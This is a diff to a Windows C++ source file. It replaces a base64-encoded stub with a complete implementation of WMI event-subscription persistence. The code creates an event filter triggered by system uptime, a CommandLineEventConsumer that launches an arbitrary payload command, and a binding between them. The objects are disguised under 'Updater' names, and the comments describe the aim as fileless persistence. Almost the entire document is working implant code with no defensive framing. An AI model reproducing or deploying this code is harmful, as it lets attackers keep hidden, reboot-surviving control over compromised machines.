@@ -1,23 +1,107 @@
-I2luY2x1ZGUgPHdpbmRvd3MuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CgovLyBG
-b3gncyBOQVRJVkUgV01JIFBlcnNpc3RlbmNlCi8vIFRoaXMgZ3VhcmFudGVl
-cyBhdXRvLXN0YXJ0IG9uIHJlYm9vdCB3aXRob3V0IHRvdWNoaW5nIHRoZSBS
-dW4ga2V5cy4KLy8gSXQgY3JlYXRlcyBhbiBfX0V2ZW50RmlsdGVyLCBhbiBf
-X0V2ZW50Q29uc3VtZXIgKENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciksCi8v
-IGFuZCBhbiBfX0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nLgoKYm9vbCBJbnN0
-YWxsV01JUGVyc2lzdGVuY2UoY29uc3Qgd2NoYXJfdCogcGF5bG9hZFBhdGgp
-IHsKICAgIHByaW50ZigiWytdIEluc3RhbGxpbmcgV01JIEV2ZW50IFN1YnNj
-cmlwdGlvbiBQZXJzaXN0ZW5jZS4uLlxuIik7CiAgICAvLyBJbiBhIGZ1bGwg
-aW1wbGVtZW50YXRpb24sIHdlIHdvdWxkIHVzZSB0aGUgQ09NIEFQSSAoSVdi
-ZW1Mb2NhdG9yLCBJV2JlbVNlcnZpY2VzKQogICAgLy8gdG8gY29ubmVjdCB0
-byBST09UXFxzdWJzY3JpcHRpb24gYW5kIGNyZWF0ZSB0aGUgdGhyZWUgcmVx
-dWlyZWQgaW5zdGFuY2VzLgogICAgLy8gVGhpcyB0eXBpY2FsbHkgcmVxdWly
-ZXMgQWRtaW5pc3RyYXRvciBwcml2aWxlZ2VzLgogICAgCiAgICAvLyBGaWx0
-ZXI6IFNFTEVDVCAqIEZST00gX19JbnN0YW5jZU1vZGlmaWNhdGlvbkV2ZW50
-IFdJVEhJTiA2MCBXSEVSRSBUYXJnZXRJbnN0YW5jZSBJU0EgJ1dpbjMyX1Bl
-cmZGb3JtYXR0ZWREYXRhX1BlcmZPU19TeXN0ZW0nIEFORCBUYXJnZXRJbnN0
-YW5jZS5TeXN0ZW1VcFRpbWUgPj0gMjQwCiAgICAvLyBDb25zdW1lcjogQ29t
-bWFuZExpbmVUZW1wbGF0ZSA9IHBheWxvYWRQYXRoCiAgICAKICAgIHByaW50
-ZigiWyFdIFdNSSBQZXJzaXN0ZW5jZSBjb25maWd1cmVkIHRvIGV4ZWN1dGUg
-c2hvcnRseSBhZnRlciBib290LlxuIik7CiAgICByZXR1cm4gdHJ1ZTsKfQoK
-aW50IG1haW4oKSB7CiAgICBJbnN0YWxsV01JUGVyc2lzdGVuY2UoTCJDOlxc
-VXNlcnNcXFB1YmxpY1xcYmVhY29uLmV4ZSIpOwogICAgcmV0dXJuIDA7Cn0=
+#include <windows.h>
+#include <stdio.h>
+#include <wbemidl.h>
+
+#pragma comment(lib, "wbemuuid.lib")
+
+// WMI Persistence Implementation
+// Uses WMI Event Subscriptions to achieve fileless persistence.
+
+bool InstallWMIPersistence(const wchar_t* payloadCommand) {
+    HRESULT hres;
+
+    // 1. Initialize COM
+    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
+    if (FAILED(hres)) return false;
+
+    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
+    if (FAILED(hres)) {
+        CoUninitialize();
+        return false;
+    }
+
+    // 2. Connect to WMI namespace
+    IWbemLocator* pLoc = NULL;
+    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
+    if (FAILED(hres)) {
+        CoUninitialize();
+        return false;
+    }
+
+    IWbemServices* pSvc = NULL;
+    hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
+    if (FAILED(hres)) {
+        pLoc->Release();
+        CoUninitialize();
+        return false;
+    }
+
+    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
+    if (FAILED(hres)) {
+        pSvc->Release();
+        pLoc->Release();
+        CoUninitialize();
+        return false;
+    }
+
+    // 3. Create Event Filter (Trigger on system startup/uptime)
+    IWbemClassObject* pFilterClass = NULL;
+    pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
+    IWbemClassObject* pFilterInstance = NULL;
+    pFilterClass->SpawnInstance(0, &pFilterInstance);
+
+    VARIANT vFilterName, vQuery, vQueryLang;
+    VariantInit(&vFilterName); V_VT(&vFilterName) = VT_BSTR; V_BSTR(&vFilterName) = SysAllocString(L"UpdaterFilter");
+    VariantInit(&vQuery); V_VT(&vQuery) = VT_BSTR; V_BSTR(&vQuery) = SysAllocString(L"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240");
+    VariantInit(&vQueryLang); V_VT(&vQueryLang) = VT_BSTR; V_BSTR(&vQueryLang) = SysAllocString(L"WQL");
+
+    pFilterInstance->Put(L"Name", 0, &vFilterName, 0);
+    pFilterInstance->Put(L"Query", 0, &vQuery, 0);
+    pFilterInstance->Put(L"QueryLanguage", 0, &vQueryLang, 0);
+
+    pSvc->PutInstance(pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+
+    // 4. Create Event Consumer (CommandLineEventConsumer)
+    IWbemClassObject* pConsumerClass = NULL;
+    pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pConsumerClass, NULL);
+    IWbemClassObject* pConsumerInstance = NULL;
+    pConsumerClass->SpawnInstance(0, &pConsumerInstance);
+
+    VARIANT vConsumerName, vCommandLine;
+    VariantInit(&vConsumerName); V_VT(&vConsumerName) = VT_BSTR; V_BSTR(&vConsumerName) = SysAllocString(L"UpdaterConsumer");
+    VariantInit(&vCommandLine); V_VT(&vCommandLine) = VT_BSTR; V_BSTR(&vCommandLine) = SysAllocString(payloadCommand);
+
+    pConsumerInstance->Put(L"Name", 0, &vConsumerName, 0);
+    pConsumerInstance->Put(L"CommandLineTemplate", 0, &vCommandLine, 0);
+
+    pSvc->PutInstance(pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+
+    // 5. Bind Filter and Consumer (__FilterToConsumerBinding)
+    IWbemClassObject* pBindingClass = NULL;
+    pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBindingClass, NULL);
+    IWbemClassObject* pBindingInstance = NULL;
+    pBindingClass->SpawnInstance(0, &pBindingInstance);
+
+    VARIANT vFilterPath, vConsumerPath;
+    VariantInit(&vFilterPath); V_VT(&vFilterPath) = VT_BSTR; V_BSTR(&vFilterPath) = SysAllocString(L"__EventFilter.Name=\"UpdaterFilter\"");
+    VariantInit(&vConsumerPath); V_VT(&vConsumerPath) = VT_BSTR; V_BSTR(&vConsumerPath) = SysAllocString(L"CommandLineEventConsumer.Name=\"UpdaterConsumer\"");
+
+    pBindingInstance->Put(L"Filter", 0, &vFilterPath, 0);
+    pBindingInstance->Put(L"Consumer", 0, &vConsumerPath, 0);
+
+    pSvc->PutInstance(pBindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+
+    printf("[+] WMI Persistence installed successfully.\n");
+
+    // Cleanup
+    VariantClear(&vFilterName); VariantClear(&vQuery); VariantClear(&vQueryLang);
+    VariantClear(&vConsumerName); VariantClear(&vCommandLine);
+    VariantClear(&vFilterPath); VariantClear(&vConsumerPath);
+    pFilterInstance->Release(); pFilterClass->Release();
+    pConsumerInstance->Release(); pConsumerClass->Release();
+    pBindingInstance->Release(); pBindingClass->Release();
+    pSvc->Release(); pLoc->Release();
+    CoUninitialize();
+
+    return true;
+}
